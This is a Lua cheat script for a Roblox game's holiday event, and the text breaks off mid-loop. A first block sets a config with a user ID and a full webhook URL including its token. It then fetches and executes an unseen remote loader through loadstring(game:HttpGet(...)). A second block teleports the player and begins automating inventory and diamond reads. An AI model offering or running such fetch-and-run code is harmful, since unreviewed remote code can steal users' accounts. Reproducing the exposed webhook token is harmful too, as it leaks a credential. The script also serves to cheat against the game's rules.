-- Execute this first
getgenv().Config = {
    ["UserID"] = "278707419536687105",
    ["Webhook"] = "https://webhook.lewisakura.moe/api/webhooks/1248523147507142656/Pk0BBjxWtIjx_1WtUaVFBzVqCg8mx3KNcNe4zMU3754EtaBOOLHc_bDb5rU46YU2a0g-"
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b883bc159a5f609adb4871db6fc15ea8.lua"))()

-- Execute this second
local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
local player = game.Players.LocalPlayer
local teleportLocation = game:GetService("Workspace").__THINGS.Instances.HolidayEvent.Teleports.Enter

if teleportLocation and teleportLocation:IsA("BasePart") then
    player.Character:SetPrimaryPartCFrame(teleportLocation.CFrame)
else
    warn("Teleport location not found or invalid!")
end
wait(30) -- adjust the time u want to, recommend 30s if u set low core and ram --

local loopInterval = 5
local snowflakeToGiftRatio = 10
local diamondPerGift = 10000

while true do
    local playerInventory = Save.Get()["Inventory"]
    local MiscInv = playerInventory["Misc"] or {}
    local snowflakeCount = 0
    local diamond = 0

    local player = game.Players.LocalPlayer
    if player then
        local leaderstats = player:FindFirstChild("leaderstats")
        if leaderstats then
            local diamondStat = leaderstats:FindFirstChild("💎 Diamonds")
            if diamondStat and diamondStat:IsA("IntValue") then
                diamond = diamondStat.Value
            else
                warn("No 💎 Diamonds found in leaderstats.")
            end
        else
  

